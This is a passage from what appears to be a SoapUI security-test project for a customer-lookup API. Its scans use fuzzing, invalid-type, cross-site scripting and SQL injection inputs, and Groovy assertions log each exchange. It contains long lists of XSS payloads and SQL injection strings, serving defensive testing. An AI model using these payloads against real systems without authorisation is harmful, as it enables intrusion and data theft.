                <token>Customer successfully retrieved</token>
                <ignoreCase>false</ignoreCase>
                <useRegEx>false</useRegEx>
              </con:configuration>
            </con:assertion>
            <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
            <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:parameters label="userId" parameterName="id" xpath="" checked="true"/>
            </con:checkedParameters>
            <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:strategy>ONE_BY_ONE</con:strategy>
              <con:delay>100</con:delay>
            </con:executionStrategy>
          </con:testStepSecurityScan>
        </con:testStepSecurityTest>
        <con:testStepSecurityTest>
          <con:testStepId>eed8a0c5-ac76-4aa2-a8e4-b7a5119a67f1</con:testStepId>
          <con:testStepSecurityScan type="FuzzingScan" name="Fuzzing Scan" id="6385afee-3f2b-431d-bd5b-d7c2c880a75b" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
            <con:settings/>
            <con:config xsi:type="con:FuzzerScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:minimal>5</con:minimal>
              <con:maximal>10</con:maximal>
              <con:numberOfRequest>25</con:numberOfRequest>
            </con:config>
            <con:assertion type="Sensitive Information Exposure" id="556b8cfd-c0f7-422a-babc-f49465772964" name="Sensitive Information Exposure">
              <con:configuration>
                <IncludeProjectSpecific>true</IncludeProjectSpecific>
                <IncludeGlobal>true</IncludeGlobal>
              </con:configuration>
            </con:assertion>
            <con:assertion type="GroovyScriptAssertion" id="76bdfa33-208b-4477-9f80-c6b25d96cfd3" name="capture runtime request data">
              <con:configuration>
                <scriptText>String response = messageExchange.getResponseContent();
String reqBody = messageExchange.getRequestContent();
String endPoint = messageExchange.getEndpoint()


HashMap&lt;String,String> properties = messageExchange.getProperties()

def parameterJson = [:]
properties.each{ key,value ->
  parameterJson[(key)] = value;
  //log.info ("Property - " + key + "::" + value);
  }
parameterString = parameterJson.toMapString()
//log.info("params -- " + parameterString);
//String changedParams = messageExchange.getProperty("SecurityChangedParameters");
def timeTaken = messageExchange.getTimeTaken();
def testStepName = context.testCase.getTestStepAt(context.getCurrentStepIndex()).getLabel();
def securityTestName = context.getCurrentScan().getParent().getName();
def scan = context.getCurrentScan().getName();

if(context.INDEX == null){
	context.INDEX = 0;
	//context.stepData = [];
}
context.INDEX = context.INDEX + 1;

KEY = securityTestName + "_" + testStepName + "_" + scan //+ "_" + System.currentTimeMillis().toString();

stepMessage = ["request": reqBody, "response": response, "timeTaken": timeTaken.toString(), "parameters": parameterString]

context.newJson &lt;&lt; [(KEY): [(context.INDEX): ["request": reqBody, "response": response, "timeTaken": timeTaken.toString(), "parameters": parameterString]]]

//context.jsonData &lt;&lt; [(KEY):["request": reqBody, "response": response, "timeTaken": timeTaken.toString(), "parameters": parameterString]];</scriptText>
              </con:configuration>
            </con:assertion>
            <con:assertion type="GroovyScriptAssertion" id="b4dc3fa7-2c83-4f1f-9c61-470633a8fc13" name="customer not retreived">
              <con:configuration>
                <scriptText>import groovy.json.JsonSlurper;


status = messageExchange.getResponseHeaders().get('status_code')[0]
log.info status
if(status == "200"){
String response = messageExchange.getResponseContent();
if(response == null){
	response = "null";
}
def json = new JsonSlurper().parseText(response);
assert(json.id == null);	
}</scriptText>
              </con:configuration>
            </con:assertion>
            <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
            <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:parameters label="accountId" parameterName="accountId" xpath="" checked="true"/>
              <con:parameters label="userId" parameterName="user_id" xpath="" checked="true"/>
              <con:parameters label="source" parameterName="source" xpath="" checked="true"/>
            </con:checkedParameters>
            <con:executionStrategy xsi:nil="true" immutable="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:strategy>ALL_AT_ONCE</con:strategy>
              <con:delay>100</con:delay>
            </con:executionStrategy>
          </con:testStepSecurityScan>
          <con:testStepSecurityScan type="CrossSiteScriptingScan" name="Cross Site Scripting" id="7b900d71-d29a-4286-8181-8c0b3296526d" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
            <con:settings/>
            <con:config xsi:type="con:CrossSiteScriptingScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:parameterExposureStrings>&lt;PLAINTEXT></con:parameterExposureStrings>
              <con:parameterExposureStrings>';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//-->&lt;/SCRIPT>">'>&lt;SCRIPT>alert(String.fromCharCode(88,83,83))&lt;/SCRIPT></con:parameterExposureStrings>
              <con:parameterExposureStrings>'';!--"&lt;XSS>=&amp;{()}</con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;SCRIPT SRC=http://soapui.org/xss.js>&lt;/SCRIPT></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC="javascript:alert('XSS');"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC=javascript:alert('XSS')></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC=JaVaScRiPt:alert('XSS')></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC=`javascript:alert("RSnake says, 'XSS'")`></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG """>&lt;SCRIPT>alert("XSS")&lt;/SCRIPT>"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))></con:parameterExposureStrings>
              <con:parameterExposureStrings><![CDATA[<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>]]></con:parameterExposureStrings>
              <con:parameterExposureStrings><![CDATA[<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>]]></con:parameterExposureStrings>
              <con:parameterExposureStrings><![CDATA[<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>]]></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC="jav	ascript:alert('XSS');"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x09;ascript:alert('XSS');"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x0A;ascript:alert('XSS');"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x0D;ascript:alert('XSS');"></con:parameterExposureStrings>
              <con:parameterExposureStrings>perl -e 'print "&lt;IMG SRC=java\0script:alert(\"XSS\")>";' > out</con:parameterExposureStrings>
              <con:parameterExposureStrings>perl -e 'print "&lt;SCR\0IPT>alert(\"XSS\")&lt;/SCR\0IPT>";' > out</con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC=" &amp;#14;  javascript:alert('XSS');"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;SCRIPT/XSS SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert("XSS")></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;SCRIPT/SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;&lt;SCRIPT>alert("XSS");//&lt;&lt;/SCRIPT></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;SCRIPT SRC=http://soapui.org/xss.js?&lt;B></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;SCRIPT SRC=//ha.ckers.org/.j></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC="javascript:alert('XSS')"</con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;iframe src=http://soapui.org/scriptlet.html &lt;</con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;SCRIPT>a=/XSS/alert(a.source)&lt;/SCRIPT></con:parameterExposureStrings>
              <con:parameterExposureStrings>\";alert('XSS');//</con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;/TITLE>&lt;SCRIPT>alert("XSS");&lt;/SCRIPT></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;BODY BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;BODY ONLOAD=alert('XSS')></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG DYNSRC="javascript:alert('XSS')"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG LOWSRC="javascript:alert('XSS')"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;BGSOUND SRC="javascript:alert('XSS');"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;BR SIZE="&amp;{alert('XSS')}"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;LAYER SRC="http://soapui.org/scriptlet.html">&lt;/LAYER></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;LINK REL="stylesheet" HREF="javascript:alert('XSS');"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;LINK REL="stylesheet" HREF="http://soapui.org/xss.css"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;STYLE>@import'http://soapui.org/xss.css';&lt;/STYLE></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;META HTTP-EQUIV="Link" Content="&lt;http://soapui.org/xss.css>; REL=stylesheet"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;STYLE>BODY{-moz-binding:url("http://soapui.org/xssmoz.xml#xss")}&lt;/STYLE></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;XSS STYLE="behavior: url(xss.htc);"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;STYLE>li {list-style-image: url("javascript:alert('XSS')");}&lt;/STYLE>&lt;UL>&lt;LI>XSS</con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC='vbscript:msgbox("XSS")'></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC="mocha:[code]"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC="livescript:[code]"></con:parameterExposureStrings>
              <con:parameterExposureStrings>�script�alert(�XSS�)�/script�</con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IFRAME SRC="javascript:alert('XSS');">&lt;/IFRAME></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;FRAMESET>&lt;FRAME SRC="javascript:alert('XSS');">&lt;/FRAMESET></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;TABLE BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;TABLE>&lt;TD BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;DIV STYLE="background-image: url(javascript:alert('XSS'))"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;DIV STYLE="background-image: url(&amp;#1;javascript:alert('XSS'))"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;DIV STYLE="width: expression(alert('XSS'));"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;STYLE>@im\port'\ja\vasc\ript:alert("XSS")';&lt;/STYLE></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;XSS STYLE="xss:expression(alert('XSS'))"></con:parameterExposureStrings>
              <con:parameterExposureStrings>exp/*&lt;A STYLE='no\xss:noxss("*//*");xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert("XSS"))'></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;STYLE TYPE="text/javascript">alert('XSS');&lt;/STYLE></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;STYLE>.XSS{background-image:url("javascript:alert('XSS')");}&lt;/STYLE>&lt;A CLASS=XSS>&lt;/A></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}&lt;/STYLE></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;!--[if gte IE 4]>&lt;SCRIPT>alert('XSS');&lt;/SCRIPT>&lt;![endif]--></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;BASE HREF="javascript:alert('XSS');//"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;OBJECT TYPE="text/x-scriptlet" DATA="http://soapui.org/scriptlet.html">&lt;/OBJECT></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389>&lt;param name=url value=javascript:alert('XSS')>&lt;/OBJECT></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;EMBED SRC="http://soapui.org/xss.swf" AllowScriptAccess="always">&lt;/EMBED></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always">&lt;/EMBED></con:parameterExposureStrings>
              <con:parameterExposureStrings>a="get";b="URL(\"";c="javascript:";d="alert('XSS');\")";eval(a+b+c+d);</con:parameterExposureStrings>
              <con:parameterExposureStrings><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]]]>><![CDATA[<![CDATA[cript:alert('XSS');">]]]]>><![CDATA[</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>]]></con:parameterExposureStrings>
              <con:parameterExposureStrings><![CDATA[<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>]]></con:parameterExposureStrings>
              <con:parameterExposureStrings><![CDATA[<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;"></BODY></HTML>]]></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;SCRIPT SRC="http://soapui.org/xss.jpg">&lt;/SCRIPT></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;? echo('&lt;SCR)';echo('IPT>alert("XSS")&lt;/SCRIPT>'); ?></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;IMG SRC="http://soapui.org/somecommand.php?somevariables=maliciouscode"></con:parameterExposureStrings>
              <con:parameterExposureStrings>Redirect 302 /a.jpg http://soapui.org/admin.asp&amp;deleteuser</con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;META HTTP-EQUIV="Set-Cookie" Content="USERID=&amp;lt;SCRIPT&amp;gt;alert('XSS')&amp;lt;/SCRIPT&amp;gt;"></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;HEAD>&lt;META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> &lt;/HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-</con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;SCRIPT a=">" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;SCRIPT =">" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;SCRIPT a=">" '' SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;SCRIPT "a='>'" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;SCRIPT a=`>` SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;SCRIPT a=">'>" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
              <con:parameterExposureStrings>&lt;SCRIPT>document.write("&lt;SCRI");&lt;/SCRIPT>PT SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
            </con:config>
            <con:assertion type="CrosSiteScript" id="3c59be0c-e384-4018-bbdb-1d392cc0e65d" name="Cross Site Scripting Detection">
              <con:configuration/>
            </con:assertion>
            <con:assertion type="Sensitive Information Exposure" id="bf841621-2cd4-4135-bda1-3d0fb244e2b3" name="Sensitive Information Exposure">
              <con:configuration>
                <IncludeProjectSpecific>true</IncludeProjectSpecific>
                <IncludeGlobal>true</IncludeGlobal>
              </con:configuration>
            </con:assertion>
            <con:assertion type="GroovyScriptAssertion" id="6592a482-e9f4-465c-bc09-946ef47e6bac" name="capture request data">
              <con:configuration>
                <scriptText>String response = messageExchange.getResponseContent();
String reqBody = messageExchange.getRequestContent();
String endPoint = messageExchange.getEndpoint()


HashMap&lt;String,String> properties = messageExchange.getProperties()

def parameterJson = [:]
properties.each{ key,value ->
  parameterJson[(key)] = value;
  //log.info ("Property - " + key + "::" + value);
  }
parameterString = parameterJson.toMapString()
//log.info("params -- " + parameterString);
//String changedParams = messageExchange.getProperty("SecurityChangedParameters");
def timeTaken = messageExchange.getTimeTaken();
def testStepName = context.testCase.getTestStepAt(context.getCurrentStepIndex()).getLabel();
def securityTestName = context.getCurrentScan().getParent().getName();
def scan = context.getCurrentScan().getName();

if(context.INDEX == null){
	context.INDEX = 0;
	//context.stepData = [];
}
context.INDEX = context.INDEX + 1;

KEY = securityTestName + "_" + testStepName + "_" + scan //+ "_" + System.currentTimeMillis().toString();

stepMessage = ["request": reqBody, "response": response, "timeTaken": timeTaken.toString(), "parameters": parameterString]

context.newJson &lt;&lt; [(KEY): [(context.INDEX): ["request": reqBody, "response": response, "timeTaken": timeTaken.toString(), "parameters": parameterString]]]

//context.jsonData &lt;&lt; [(KEY):["request": reqBody, "response": response, "timeTaken": timeTaken.toString(), "parameters": parameterString]];</scriptText>
              </con:configuration>
            </con:assertion>
            <con:assertion type="GroovyScriptAssertion" id="a1b6c9ec-18fa-42cd-b5e9-276c5fcba8ee" name="customer not retreived">
              <con:configuration>
                <scriptText>import groovy.json.JsonSlurper;


status = messageExchange.getResponseHeaders().get('status_code')[0]

if(status == "200"){
String response = messageExchange.getResponseContent();
if(response == null){
	response = "null";
}
def json = new JsonSlurper().parseText(response);
assert(json.id == null);	
}</scriptText>
              </con:configuration>
            </con:assertion>
            <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
            <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:parameters label="accoundId" parameterName="accountId" xpath="" checked="true"/>
              <con:parameters label="userId" parameterName="user_id" xpath="" checked="true"/>
              <con:parameters label="source" parameterName="source" xpath="" checked="true"/>
            </con:checkedParameters>
            <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:strategy>ONE_BY_ONE</con:strategy>
              <con:delay>100</con:delay>
            </con:executionStrategy>
          </con:testStepSecurityScan>
          <con:testStepSecurityScan type="InvalidTypesSecurityScan" name="Invalid Types" id="8a8eaf04-961e-4f54-91f3-9f19ce7e4f42" applyForFailedStep="false" disabled="false" runOnlyOnce="false">
            <con:settings/>
            <con:config xsi:type="con:InvalidSecurityScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:typesList>
                <con:type>3</con:type>
                <con:value>true</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>4</con:type>
                <con:value>GpM7</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>5</con:type>
                <con:value>0FB7</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>9</con:type>
                <con:value>-1E4f</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>10</con:type>
                <con:value>12.45E+12</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>11</con:type>
                <con:value>-1.23</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>12</con:type>
                <con:value>SoapUI is	 the
 best</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>13</con:type>
                <con:value>P1Y2M3DT10H30M12.3S</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>14</con:type>
                <con:value>1999-05-31T13:20:00.000-05:00</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>16</con:type>
                <con:value>1999-05-31</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>22</con:type>
                <con:value>-1267896799</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>23</con:type>
                <con:value>-882223334991111111</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>24</con:type>
                <con:value>-2147483647</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>25</con:type>
                <con:value>-32768</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>26</con:type>
                <con:value>127</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>27</con:type>
                <con:value>0</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>28</con:type>
                <con:value>-1</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>29</con:type>
                <con:value>1</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>30</con:type>
                <con:value>1267896799</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>31</con:type>
                <con:value>882223334991111111</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>32</con:type>
                <con:value>294967295</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>33</con:type>
                <con:value>65535</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>34</con:type>
                <con:value>255</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>35</con:type>
                <con:value>SoapUI is the best</con:value>
              </con:typesList>
              <con:typesList>
                <con:type>36</con:type>
                <con:value>SoapUI is the best</con:value>
              </con:typesList>
            </con:config>
            <con:assertion type="Sensitive Information Exposure" id="2c085b9e-2079-4bc1-8456-2d05a77129d0" name="Sensitive Information Exposure">
              <con:configuration>
                <IncludeProjectSpecific>true</IncludeProjectSpecific>
                <IncludeGlobal>true</IncludeGlobal>
              </con:configuration>
            </con:assertion>
            <con:assertion type="GroovyScriptAssertion" id="867a584b-9e6e-47fe-ab54-23d03730abe2" name="capture request data">
              <con:configuration>
                <scriptText>String response = messageExchange.getResponseContent();
String reqBody = messageExchange.getRequestContent();
String endPoint = messageExchange.getEndpoint()


HashMap&lt;String,String> properties = messageExchange.getProperties()

def parameterJson = [:]
properties.each{ key,value ->
  parameterJson[(key)] = value;
  //log.info ("Property - " + key + "::" + value);
  }
parameterString = parameterJson.toMapString()
//log.info("params -- " + parameterString);
//String changedParams = messageExchange.getProperty("SecurityChangedParameters");
def timeTaken = messageExchange.getTimeTaken();
def testStepName = context.testCase.getTestStepAt(context.getCurrentStepIndex()).getLabel();
def securityTestName = context.getCurrentScan().getParent().getName();
def scan = context.getCurrentScan().getName();

if(context.INDEX == null){
	context.INDEX = 0;
	//context.stepData = [];
}
context.INDEX = context.INDEX + 1;

KEY = securityTestName + "_" + testStepName + "_" + scan //+ "_" + System.currentTimeMillis().toString();

stepMessage = ["request": reqBody, "response": response, "timeTaken": timeTaken.toString(), "parameters": parameterString]

context.newJson &lt;&lt; [(KEY): [(context.INDEX): ["request": reqBody, "response": response, "timeTaken": timeTaken.toString(), "parameters": parameterString]]]

//context.jsonData &lt;&lt; [(KEY):["request": reqBody, "response": response, "timeTaken": timeTaken.toString(), "parameters": parameterString]];</scriptText>
              </con:configuration>
            </con:assertion>
            <con:assertion type="GroovyScriptAssertion" id="830ed9aa-350c-4ddb-a1c6-85594db3da88" name="Customer details not retreived">
              <con:configuration>
                <scriptText>import groovy.json.JsonSlurper;


status = messageExchange.getResponseHeaders().get('status_code')[0]

if(status == "200"){
String response = messageExchange.getResponseContent();
if(response == null){
	response = "null";
}
def json = new JsonSlurper().parseText(response);
assert(json.id == null);	
}</scriptText>
              </con:configuration>
            </con:assertion>
            <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
            <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:parameters label="accountId" parameterName="accountId" xpath="" checked="true"/>
              <con:parameters label="userId" parameterName="user_id" xpath="" checked="true"/>
              <con:parameters label="source" parameterName="source" xpath="" checked="true"/>
            </con:checkedParameters>
            <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:strategy>ONE_BY_ONE</con:strategy>
              <con:delay>100</con:delay>
            </con:executionStrategy>
          </con:testStepSecurityScan>
          <con:testStepSecurityScan type="SQLInjectionScan" name="SQL Injection" id="4d183a3f-1f9f-403b-8de9-316841ccdfa8" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
            <con:settings/>
            <con:config xsi:type="con:SQLInjectionScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:sqlInjectionStrings>' or '1'='1</con:sqlInjectionStrings>
              <con:sqlInjectionStrings>'--</con:sqlInjectionStrings>
              <con:sqlInjectionStrings>1'</con:sqlInjectionStrings>
              <con:sqlInjectionStrings>admin'--</con:sqlInjectionStrings>
              <con:sqlInjectionStrings>/*!10000%201/0%20*/</con:sqlInjectionStrings>
              <con:sqlInjectionStrings>/*!10000 1/0 */</con:sqlInjectionStrings>
              <con:sqlInjectionStrings>1/0</con:sqlInjectionStrings>
              <con:sqlInjectionStrings>'%20o/**/r%201/0%20--</con:sqlInjectionStrings>
              <con:sqlInjectionStrings>' o/**/r 1/0 --</con:sqlInjectionStrings>
              <con:sqlInjectionStrings>;</con:sqlInjectionStrings>
              <con:sqlInjectionStrings>'%20and%201=2%20--</con:sqlInjectionStrings>
              <con:sqlInjectionStrings>' and 1=2 --</con:sqlInjectionStrings>
              <con:sqlInjectionStrings>test�%20UNION%20select%201,%20@@version,%201,%201;�</con:sqlInjectionStrings>
              <con:sqlInjectionStrings>test� UNION select 1, @@version, 1, 1;�</con:sqlInjectionStrings>
            </con:config>
            <con:assertion type="Sensitive Information Exposure" id="fbb90b23-772e-42bf-958f-fe34f88b179d" name="Sensitive Information Exposure">
              <con:configuration>
                <IncludeProjectSpecific>true</IncludeProjectSpecific>
                <IncludeGlobal>true</IncludeGlobal>
              </con:configuration>
            </con:assertion>
            <con:assertion type="GroovyScriptAssertion" id="238202f8-62ea-4db7-b3e5-7931c25cd8a9" name="capture request data">
              <con:configuration>
                <scriptText>String response = messageExchange.getResponseContent();
String reqBody = messageExchange.getRequestContent();
String endPoint = messageExchange.getEndpoint()


HashMap&lt;String,String> properties = messageExchange.getProperties()

def parameterJson = [:]
properties.each{ key,value ->
  parameterJson[(key)] = value;
  //log.info ("Property - " + key + "::" + value);
  }
parameterString = parameterJson.toMapString()
//log.info("params -- " + parameterString);
//String changedParams = messageExchange.getProperty("SecurityChangedParameters");
def timeTaken = messageExchange.getTimeTaken();
def testStepName = context.testCase.getTestStepAt(context.getCurrentStepIndex()).getLabel();
def securityTestName = context.getCurrentScan().getParent().getName();
def scan = context.getCurrentScan().getName();

if(context.INDEX == null){
	context.INDEX = 0;
	//context.stepData = [];
}
context.INDEX = context.INDEX + 1;

KEY = securityTestName + "_" + testStepName + "_" + scan //+ "_" + System.currentTimeMillis().toString();

stepMessage = ["request": reqBody, "response": response, "timeTaken": timeTaken.toString(), "parameters": parameterString]

